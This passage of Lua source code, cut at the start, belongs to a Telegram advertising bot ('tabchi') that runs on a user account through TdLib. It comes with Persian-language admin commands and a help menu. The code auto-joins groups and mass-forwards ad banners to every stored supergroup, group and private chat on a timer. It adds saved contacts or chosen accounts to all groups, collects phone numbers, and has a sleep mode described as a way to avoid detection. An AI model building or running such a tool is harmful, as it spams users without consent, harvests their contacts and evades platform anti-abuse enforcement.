	 end
	  if (result.code == 429) then
     send_msg(464075452,"result: code==429")
	 end
	 	  if (extra.again) then
     send_msg(464075452,"result: again join")
	 end
	 	 	  if (extra.join and extra.again) then
     send_msg(464075452,"result: again join")
	 end
	 	 	 	  if (result.title and extra.title) then
     send_msg(464075452,"result: find title")
	 end
     end
       --check_link(abc),check_abc)
       check_link(abc,check_abc)
     end]]
if msg.content.text:match("#setabout") and is_admin(msg) then 
send_msg(msg.chat_id,'این قابلیت غیر فعال شده است باشد تا گشاد نباشیم!')
end
if msg.content.text:match("#echo") and is_admin(msg)  then 
local text = msg.content.text:gsub('#echo', '')
send_msg(msg.chat_id,text)
end
if msg.content.text == "#bc gp" and is_admin(msg)  then 
redis:set(tabinum.."tabchi_bc_gp","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 
if msg.content.text == "#bc pv" and is_admin(msg)  then 
redis:set(tabinum.."tabchi_bc_pv","ok") 
send_msg(msg.chat_id,"حالا متن خود را ارسال کنید") 
return false 
end 

function deleteMessages(chatid, mid) 
 assert (tdbot_function ({ 
_ = "deleteMessages", 
chat_id = chatid, 
message_ids = mid 
  }, dl_cb, CerNer)) 
end 

if msg.content.text == 'افزودن ممبربات' and is_admin(msg) then 
local add = redis:smembers(tabinum.."tabchi_contacts_id") 
for i=1 , #add do 
add_user(msg.chat_id, add[i]) 
end 
send_msg(msg.chat_id,"▪️افزودن اعضا با موفقیت انجام شد!") 
end 
-------------------------- 
if msg.content.text == '#addtoall' and is_admin(msg) then 

send_msg(msg.chat_id,"حال لطفا ایدی عددی هشت یا نه رقمی اکانت مورد نظر را برای اضافه کردن به همه گروه ها بفرستید",msg.id) 
redis:set(tabinum.."tabchi_addtoall","ok") 
--[[for i=1 , #add do 
add_user(msg.chat_id, add[i]) 
end 
send_msg(msg.chat_id,"add finish") 
end ]] 
end 
if msg.content.text == '#setaddtoall' and is_admin(msg) then 

send_msg(msg.chat_id,"حال لطفا ایدی عددی هشت یا نه رقمی اکانت مورد نظر را برای اضافه کردن هوشمندانه به گروه ها بفرستید.",msg.id) 
redis:set(tabinum.."wait_addall","ok") 
--[[for i=1 , #add do 
add_user(msg.chat_id, add[i]) 
end 
send_msg(msg.chat_id,"add finish") 
end ]] 
end 
----------- 
if msg.content.text == '#random' and  is_admin(msg) then 
local mid = redis:srandmember(tabinum..'tabchi_baner_mmid',1) 
local cid = redis:get(tabinum.."tabchi_baner_cid") 
fwd_msg(cid,msg.chat_id,mid[math.random(#mid)]) 
end 
----------- 
if msg.content.text == '#setbaner' and msg.reply_to_message_id and is_admin(msg) then 
redis:sadd(tabinum.."tabchi_baner_mmid",msg.reply_to_message_id) 
redis:set(tabinum.."tabchi_baner_cid",msg.chat_id) 
send_msg(msg.chat_id,"بنر تبلیغات با موفقیت تنظیم شد!") 
end 
if msg.content.text == '#getbaner' and is_admin(msg) then 
local mid = redis:smembers(tabinum.."tabchi_baner_mmid") 
local cid = redis:get(tabinum.."tabchi_baner_cid") 
for i=1 , #mid do 
fwd_msg(cid,msg.chat_id,mid[i]) 
end 
end 
---------- 
if msg.content.text == '#banerlist' and is_admin(msg) then 
local mid = redis:smembers(tabinum.."tabchi_baner_mmid") 
text = "تعداد بنر های شما ["..#mid.."]\n" 
for i=1 , #mid do 
text = text.."> "..mid[i].."\n" 
end 
send_msg(msg.chat_id,text,msg.id) 
end 
---------- 
if msg.content.text == '#delallbaner' and is_admin(msg) then 
redis:del(tabinum.."tabchi_baner_mmid") 
redis:del(tabinum.."tabchi_baner_cid") 
send_msg(msg.chat_id,"تمامی پست های تنظیم شده برای تبلیغات هوشمند پاک شدند!",msg.id) 
end 
---------- 
if msg.content.text == '#delbaner' and is_admin(msg) and msg.reply_to_message_id then 
redis:srem(tabinum.."tabchi_baner_mmid",msg.reply_to_message_id) 
send_msg(msg.chat_id,"این پست از سامانه تبلیغات هوشمند حذف شد.",msg.id) 
end 
-------
if msg.content.text == '#leftname on' and is_admin(msg) then 
redis:set(tabinum.."leftname","ok") 
send_msg(msg.chat_id,"خروج از گروه ها بااسامی خاص فعال شد!",msg.id) 
end 
if msg.content.text == '#leftname off' and is_admin(msg) then 
redis:del(tabinum.."leftname") 
send_msg(msg.chat_id,"خروج از گروه ها بااسامی خاص غیرفعال شد!",msg.id) 
end 
if msg.content.text:match("^#(addlname) (.*)$") then
local matches = msg.content.text:match("^#addlname (.*)$")
if not redis:sismember(tabinum.."leftnamecheck",matches) then 
redis:sadd(tabinum.."leftnamecheck",matches) 
send_msg(msg.chat_id,"اسم "..matches.." به اسامی خاص افزوده شد",msg.id) 
else
send_msg(msg.chat_id,"اسم "..matches.." در لیست اسامی خاص بود",msg.id) 
end
end
if msg.content.text:match("^#(remlname) (.*)$") then
local matches = msg.content.text:match("^#remlname (.*)$")
if not redis:sismember(tabinum.."leftnamecheck",matches) then 
send_msg(msg.chat_id,"اسم "..matches.." در لیست اسامی خاص نبود",msg.id) 
else
send_msg(msg.chat_id,"اسم "..matches.." از لیست اسامی خاص حذف شد",msg.id) 
redis:srem(tabinum.."leftnamecheck",matches) 
end
end
------- 
if msg.content.text == '#autofwd on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_autofwd","ok") 
send_msg(msg.chat_id,"تبلیغات اتوماتیک در گروه ها با زمانبندی مشخص فعال شد!",msg.id) 
end 
if msg.content.text == '#autofwd off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_autofwd") 
send_msg(msg.chat_id,"تبلیغات اتوماتیک در گروه ها غیر فعال شد!",msg.id) 
end 
------------------------------ 
if msg.content.text == '#getrandombaner' and  is_admin(msg) then 
local r_chat = redis:get(tabinum.."rand_cid")
local m_id = redis:get(tabinum.."rand_mid")
fwd_msg(r_chat,msg.chat_id,m_id)
end
---------------------
if msg.content.text == '#setrandombaner' and msg.reply_to_message_id and is_admin(msg) then 
redis:set(tabinum.."rand_mid",msg.reply_to_message_id) 
redis:set(tabinum.."rand_cid",msg.chat_id) 
send_msg(msg.chat_id,"بنر تبلیغات با موفقیت تنظیم شد !") 
end 
-----------------------------
if msg.content.text == '#autorandom on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_autorandom","ok") 
local fwdt = redis:get(tabinum.."fwdtime")
send_msg(msg.chat_id,"انجام شد ! \n حال ربات شما بنر تنظیم شده را هر "..tonumber(fwdt).." ثانیه به تمام گروه های خود ارسال خواهد کرد.",msg.id) 
end 
if msg.content.text == '#autorandom off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_autorandom") 
send_msg(msg.chat_id,"ارسال خودکار تبلیغات خاموش شد!",msg.id) 
end 
------------------------------
if msg.content.text == '#tableft on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_tableft","ok") 
send_msg(msg.chat_id,"تبلیغ بنر هوشمند و لفت فعال شد.حتما دقت کنید که بنر را تنظیم کرده باشید",msg.id) 
end 
if msg.content.text == '#tableft off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_tableft") 
send_msg(msg.chat_id," تبلیغ بنر هوشمند و لفت غیرفعال شد.",msg.id) 
end 
------------------------------

if msg.content.text == '#addleft on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_addleft","ok") 
send_msg(msg.chat_id,"افزودن خودکار ربات هوشمند و لفت فعال شد.حتما دقت کنید که ربات هوشمند را تنظیم کرده باشید",msg.id) 
end 
if msg.content.text == '#addleft off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_addleft") 
send_msg(msg.chat_id,"افزودن خودکار ربات هوشمند و لفت غیرفعال شد.",msg.id) 
end 
--------------------------- 
if msg.content.text == '#autoaddtoall on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_autoaddtoall","ok") 
send_msg(msg.chat_id,"اضافه کردن اتوماتیک در گروه ها فعال شد",msg.id) 
end 
if msg.content.text == '#autoaddtoall off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_autoaddtoall") 
send_msg(msg.chat_id,"اضافه کردن اتوماتیک در گروه ها غیر فعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == '#autoleft on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_autoleft","ok") 
send_msg(msg.chat_id,"ترک اتوماتیک گروه ها فعال شد!",msg.id) 
end 
if msg.content.text == '#autoleft off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_autoleft") 
send_msg(msg.chat_id,"ترک اتوماتیک گروه ها غیر فعال شد!",msg.id) 
end 
--------------------------- --------------------------- 
if msg.content.text == '#channelleft on' and is_admin(msg) then 
redis:set(tabinum.."channelleft","ok") 
send_msg(msg.chat_id,"لفت خودکار از کانال ها فعال شد!",msg.id) 
end 
if msg.content.text == '#channelleft off' and is_admin(msg) then 
redis:del(tabinum.."channelleft") 
send_msg(msg.chat_id,"لفت خودکار از کانال ها غیرفعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == '#groupleft on' and is_admin(msg) then 
redis:set(tabinum.."groupleft","ok") 
send_msg(msg.chat_id,"لفت خودکار از گروه ها فعال شد!",msg.id) 
end 
if msg.content.text == '#groupleft off' and is_admin(msg) then 
redis:del(tabinum.."groupleft") 
send_msg(msg.chat_id,"لفت خودکار از گروه ها غیرفعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == '#join on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_autojoin","ok") 
send_msg(msg.chat_id,"عضویت اتوماتیک در گروه ها فعال شد!",msg.id) 
end 
if msg.content.text == '#join off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_autojoin") 
send_msg(msg.chat_id,"عضویت اتوماتیک در گروه ها غیر فعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == '#sec on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_autosec","ok") 
send_msg(msg.chat_id,"حالت امنیتی اتوماتیک جهت حفاظت از تبلیغاتی فعال شد",msg.id) 
end 
if msg.content.text == '#sec off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_autosec") 
send_msg(msg.chat_id,"حالت امنیتی اتوماتیک غیر فعال شد!",msg.id) 
end 
--------------------------- 
if msg.content.text == '#ping' and is_admin(msg) then 
fwd_msg(msg.chat_id,msg.chat_id,msg.id) 
end 
--------------------------- 
if msg.content.text == '#sec_savenumber on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_autosecsave","ok") 
send_msg(msg.chat_id,"حالت امنیتی سیو کردن شماره ها فعال شد!",msg.id) 
end 
if msg.content.text == '#sec_savenumber off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_autosecsave") 
send_msg(msg.chat_id,"حالت امنیتی سیو کردن شماره ها غیر فعال شد!",msg.id) 
end 
----_-------_-------------- 
if msg.content.text == '#markread on' and is_admin(msg) then 
redis:set(tabinum.."tabchi_markread","ok") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی پیام های ارسالی را بازدید میکند!",msg.id) 
end 
if msg.content.text == '#markread off' and is_admin(msg) then 
redis:del(tabinum.."tabchi_markread") 
send_msg(msg.chat_id,"هم اکنون تبلیغاتی پیام های ارسالی را بازدید نمیکند!",msg.id) 
end 
---------------------------
---  ---
if msg.content.text:match('#fs_random') and msg.reply_to_message_id and is_admin(msg) then 
--matches = msg.content.text:gsub('#fs_random','') 
local lol = redis:smembers(tabinum.."tabchi_sugp")

for i=1, #lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
end 
send_msg(msg.chat_id,"▪️ has been Sent to "..#lol.." supergroup with random mode😏 ▪️") 
end 
------------------------ 

if msg.content.text == '#fs' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers(tabinum.."tabchi_sugp") 
for i=1, #lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
redis:sadd(tabinum.."sended", lol[i])
end 
send_msg(msg.chat_id,"has been Sent!") 
redis:set(tabinum.."on-offmsg", msg.reply_to_message_id)
redis:set(tabinum.."on-offchat", msg.chat_id)
end 
--------------------------

if msg.content.text == '#fall' and msg.reply_to_message_id and is_admin(msg) then
local lol = redis:smembers(tabinum.."tabchi_sugp")
local lol1 = redis:smembers(tabinum.."tabchi_gp")
local lol2 = redis:smembers(tabinum.."tabchi_pv")
	local id = msg.reply_to_message_id
for i, v in pairs(lol) do
openChat(v, dl_cb, nil)
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
							redis:sadd(tabinum.."sended", tonumber(v))
end
for i, v in pairs(lol1) do
openChat(v, dl_cb, nil)
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
							redis:sadd(tabinum.."sended", tonumber(v))
end
for i, v in pairs(lol2) do
openChat(v, dl_cb, nil)
							assert (tdbot_function({
								_ = "forwardMessages",
								chat_id = tonumber(v),
								from_chat_id = msg.chat_id,
								message_ids = {[0] = id},
								disable_notification = 1,
								from_background = 1
							}, dl_cb, nil))
							redis:sadd(tabinum.."sended", tonumber(v))
end
--[[for i=1, #lol do
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id)
redis:sadd(tabinum.."sended", lol[i])
end
for i=1, #lol1 do
fwd_msg(msg.chat_id,lol1[i],msg.reply_to_message_id)
redis:sadd(tabinum.."sended", lol1[i])
end
for i=1, #lol2 do
fwd_msg(msg.chat_id,lol2[i],msg.reply_to_message_id)
redis:sadd(tabinum.."sended", lol2[i])
end]]
send_msg(msg.chat_id,"has been Sent to "..#lol.." Super Groups and "..#lol1.." Groups and "..#lol2.." Pvs")
redis:set(tabinum.."on-offmsg", msg.reply_to_message_id)
redis:set(tabinum.."on-offchat", msg.chat_id)
end

--------------------------
if msg.content.text == '#fg' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers(tabinum.."tabchi_gp") 
for i=1, #lol do 
openChat(lol[i], dl_cb, nil)
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id)
redis:sadd(tabinum.."sended", lol[i]) 
end 
send_msg(msg.chat_id,"has been Sent!") 
redis:set(tabinum.."on-offmsg", msg.reply_to_message_id)
redis:set(tabinum.."on-offchat", msg.chat_id)
end 
--------------------- 
if msg.content.text == '#fv' and msg.reply_to_message_id and is_admin(msg) then 
local lol = redis:smembers(tabinum.."tabchi_pv") 
for i=1, #lol do 
fwd_msg(msg.chat_id,lol[i],msg.reply_to_message_id) 
redis:sadd(tabinum.."sended", lol[i])
end 
send_msg(msg.chat_id,"has been Sent!") 
redis:set(tabinum.."on-offmsg", msg.reply_to_message_id)
redis:set(tabinum.."on-offchat", msg.chat_id)
end 
if msg.content.text == "#reset" and is_admin(msg) then 
if not redis:get(tabinum.."reset") then
redis:del(tabinum.."all:pm") 
redis:del(tabinum.."bot_msg") 
redis:del(tabinum.."tabchi_bot") 
redis:del(tabinum.."tabchi_gp") 
redis:del(tabinum.."tabchi_pv") 
redis:del(tabinum.."tabchi_sugp") 
redis:del(tabinum.."tabchi_contacts_id") 
redis:del(tabinum.."tabchi_alllinks")
send_msg(msg.chat_id,"▪️سیستم امارگیری تبلیغاتی بازنشانی شد!",msg.id) 
redis:setex(tabinum.."reset", 86400, true)
else
send_msg(msg.chat_id,"▪️شما هرروز یکبار میتوانید اینکار را انجام دهید!\nزمان باقی مانده:"..redis:ttl(tabinum.."reset"),msg.id) 
end
end 
if msg.content.text == '#updatebot' and is_admin(msg) then 
if not redis:get(tabinum.."updatebot") then
					get_bot()
send_msg(msg.chat_id,"مشخصات فردی تبلیغاتی "..tabinum.." به روز رسانی شد ") 
redis:setex(tabinum.."updatebot", 86400, true)
else
send_msg(msg.chat_id,"▪️شما هرروز یکبار میتوانید اینکار را انجام دهید!\nزمان باقی مانده:"..redis:ttl(tabinum.."updatebot"),msg.id) 
end
					end
if msg.content.text == '#reload' and is_admin(msg) then 
if not redis:get(tabinum.."reload") then
					reload()
send_msg(msg.chat_id,"ربات شماره "..tabinum.." از نو راه اندازی شد") 
redis:setex(tabinum.."reload", 86400, true)
else
send_msg(msg.chat_id,"▪️شما هرروز یکبار میتوانید اینکار را انجام دهید!\nزمان باقی مانده:"..redis:ttl(tabinum.."reload"),msg.id) 
end
					end
if msg.content.text == "#settings" and is_admin(msg) then 
local who_join = redis:get(tabinum.."tabchi_autojoin") 
local who_left = redis:get(tabinum.."tabchi_autoleft") 
local who_mark = redis:get(tabinum.."tabchi_markread") 
local who_autofwd = redis:get(tabinum.."tabchi_autofwd") 
local who_numsave = redis:get(tabinum.."tabchi_save") 
local who_addtoall = redis:get(tabinum.."tabchi_autoaddtoall") 
local who_randomfwd = redis:get(tabinum.."tabchi_autorandom")
local is_typing = redis:get(tabinum.."tab_typing")
local groupleft = redis:get(tabinum.."groupleft")
local channelleft = redis:get(tabinum.."channelleft")
if groupleft then
gleft = "[✅]"
else
gleft = "[🚫]" 
end
if channelleft then
chleft = "[✅]"
else
chleft = "[🚫]" 
end
if is_typing then
ist = "[✅]"
else
ist = "[🚫]" 
end
if who_randomfwd then
randfwd = "[✅]"
else
randfwd = "[🚫]"
end
if who_addtoall then 
addt = "[✅]" 
else 
addt = "[🚫]" 
end 
if who_join then 
addjn = "[✅]" 
else 
addjn = "[🚫]" 
end 
if who_mark then 
addmk = "[✅]" 
else 
addmk = "[🚫]" 
end 
if who_autofwd then 
auto = "[✅]" 
else 
auto = "[🚫]" 
end 
if who_left then 
autolf = "[✅]" 
else 
autolf = "[🚫]" 
end 
if who_numsave then 
numtext = "[✅]" 
else 
numtext = "[🚫]" 
end 
local mid = redis:get(tabinum.."tabchi_baner_mid") 
local settings = "▪️تنظیمات تبلیغاتی\n▫️تبلیغات هوشمند: "..auto.."\n▫️سیو کردن شماره ها: "..numtext.."\n▫️اضافه کردن اتوماتیک به گروه ها:  "..addt.."\n▫️لفت دادن اتوماتیک از گروه ها: "..autolf.."\n▫️عضویت اتوماتیک در گروه ها: "..addjn.."\n▫️تبلیغات اتوماتیک رندم در گروه ها: "..randfwd.."\n▫️ارسال تایپینگ در گروه ها: "..ist.."\n▫️لفت اتوماتیک کانال ها: "..chleft.."\n▫️لفت اتوماتیک گروه ها: "..gleft.."\n\nتبلیغاتی ورژن 1.6(@AYTOR)"
send_msg(msg.chat_id,settings) 
end 
if (msg.content.text == "#tablighati" or msg.content.text == "تبلیغاتی") and is_admin(msg) then 
local tab = [[ 
▪️تبلیغاتی
▫️ورژن:1.6
▫️برپایه: TdAFBoTS(استفاده شده از TdLib)
▫️زبان کدنویسی: Lua(استفاده شده از Redis)
▫️قابلیت پشتیبانی: اکانت های cli(حتی 9رقمی)

▪️ای اف 
▫️کانال: @AYTOR
▫توسعه دهنده: @mohammadhozori

کیفیت را به قیمت نفروشیم!
برتر بودن هنر میخواهد!
]]
send_msg(msg.chat_id,tab,msg.id) 
end 
if msg.content.text == "#help" and is_admin(msg) then 
local help = [[ 
لیست راهنمای تبلیغاتی:
امار ربات ⤵️
دریافت آمار ربات
#join {on,off} ⤵️
خاموش یا روشن کردن عضویت خودکار 
#channelleft {on,off} ⤵️
خاموش یا روشن کردن لفت از کانال
#setbaner {reply} ⤵️
تنظیم بنر با ریپلی
#getbaner ⤵️
دریافت بنر تنظیم شده
#delbaner {reply} ⤵️
حذف بنر از لیست بنر ها
#delallbaner ⤵️
حذف تمام بنر های تنظیم شده
#banerlist ⤵️
دریافت لیست بنر ها
#savenumber {on,off} ⤵️
خاموش یا روشن کردن ذخیره مخاطب
#groupleft {on,off} ⤵️
خاموش یا روشن کردن لفت از گروه های عادی
#settings ⤵️
دریافت تنظیمات ربات
#bc {su,pv,gp} ⤵️
ارسال متن به گروه یا پیوی یا سوپر گروه ها 
#fwd {su,gp,pv} ⤵️
فروارد متن شما به گروه یا سوپر گروه یا پیوی ها
#fs {reply} ⤵️
ارسال هرگونه متن و یا مدیا با رپلای به سوپر گروه ها
#fall {reply} ⤵️
ارسال هرگونه متن و یا مدیا با رپلای به سوپر گروه ها و گروه ها و پی وی ها
#fg {reply} ⤵️
ارسال هرگونه متن و یا مدیا با رپلای به گروه ها 
#addmembers ⤵️
افزودن مخاطب های ذخیره شده در گروه 
#addtoall ⤵️
افزودن ربات یا مخاطب در گروه های ربات ( ابتدا متن را ارسال کنید سپس از شما ایدی خواسته میشود )
#setaddtoall ⤵️
تنظیم کردن ایدی برای اد ال خودکار ( ابتدا متن را ارسال کنید سپس از شما ایدی خواسته میشود )
#autoaddtoall {on,off} ⤵️
خاموش یا روشن کردن افزودن محاطب به صورت خودکار
#addleft {on,off} ⤵️
افزودن مخاطب در گروه و لفت هوشمند از گروه 
#left ⤵️
ترک گروه مورد نظر
#leftall ⤵️
لفت از همه گروه ها
#autoleft {on,off} ⤵️
روشن خاموش کردن حالت ترک اتوماتیک گروه ها 
#leftname {on,off} ⤵️
روشن یا خاموش کردن لفت خودکار بااسامی خاص
#addlname ⤵️
افزودن اسم به اسامی خاص
#remlname ⤵️
حذف کردن اسم از اسامی خاص
#reset ⤵️
بازنشانی آمار ربات ( هر روز یکبار مجاز است )
#sec {on,off} ⤵️
روشن یا خاموش کردن  حفاظت از ربات به صورت خودکار
#joinall ⤵️
ربات در گروه و کانال عضو خواهد شد (عضویت سریع) درحالت دیفالت فعال است !
#autofwd {on,off} ⤵️
خاموش یا روشن کردن فوروارد اتوماتیک با زمان بندی مشخص
#onlygroup ⤵️
ربات فقط در گروه ها عضو میشود (توجه داشته باشید که بخاطر چک کردن لینک ها ربات زود محدود میشود و عضویت کند خواهد شد)
#setfwdtime { second }⤵️
تنظیم زمان برای ارسال خودکار بنر تنظیم شده
#setfwdbaner {reply} ⤵️
تنظیم بنر برای ارسال خودکار در گروه های ربات
#getfwdbaner ⤵️
دریافت بنر تنظیم شده برای ارسال خودکار
#fwdnew {on,off} ⤵️
اگر روشن باشد ربات هنگام جوین شدن به گروه با دریافت اولین پیام آخرین تبلیغ ارسال شده شما را در گروه ارسال خواهد کرد
#echo {text} ⤵️
تکرار کردن متن شما
#sethtext (text) ⤵️
تنظیم متن برای هایپر
#md (link) ⤵️
دریافت هایپر با متن از قبل تنظیم شده و لینک جدید
#fwdsg (reply) ⤵️
فوروارد بنر ریپلی شده به گروه و سوپر گروه
#bcall (reply) ⤵️
ارسال متن بنر ریپلی شده به گروه و سوپر گروه
#updatebot ⤵️
تازه سازی اطلاعات ربات ( برای ربات های جدید ساخته شده الزامی است )
#ping ⤵️
چک کردن آنلاین بودن ربات حتی اگه ریپورت چت شده باشد 
#version ⤵️
دریافت اطلاعات از نسخه و سازنده سورس کد
#botinfo ⤵️
دریافت اطلاعات ربات
تبلیغاتی ورژن 1.6(@AYTOR)
]] 
send_msg(msg.chat_id,help,msg.id) 
end 

if msg.content.text == '#left' and is_admin(msg) then 
send_msg(msg.chat_id,"تبلیغاتی با ایدی عددی "..bot.."از گروه خارج میشود") 
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(msg.chat_id),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
end 
---------------------------- 
if msg.content.text == '#leftall' and is_admin(msg) then 
local lgp = redis:smembers(tabinum.."tabchi_gp") 
local lsug = redis:smembers(tabinum.."tabchi_sugp") 
local lgpn = redis:scard(tabinum.."tabchi_gp") 
local lsugn = redis:scard(tabinum.."tabchi_sugp") 
for i=1 , #lgp do 
openChat(lgp[i], dl_cb, nil)
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(lgp[i]),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
end 
for i=1 , #lsug do 
openChat(lsug[i], dl_cb, nil)
assert (tdbot_function ({
    _ = "setChatMemberStatus",
    chat_id = tonumber(lsug[i]),
    user_id = tonumber(bot),
    status = {
      _ = "chatMemberStatusLeft"
	}
}, dl_cb, nil))
end 
send_msg(msg.chat_id,"تبلیغاتی از "..lgpn.."گروه و از "..lsugn.."لفت داد",msg.id) 
end 
---------------------------- 
if msg.content.text == "#rest" and is_admin(msg) then 
redis:setex(tabinum.."tab_sleep",2000,true) 
send_msg(msg.chat_id,"▪️تبلیغاتی از الان تا یک ساعت دیگر جهت شناسایی نشدن و همچنین استراحت سرور به خواب میرود!",msg.id) 
end 
---------------------------- 

end 
end 
end
--Writeen by : @MOHAMMADHOZORI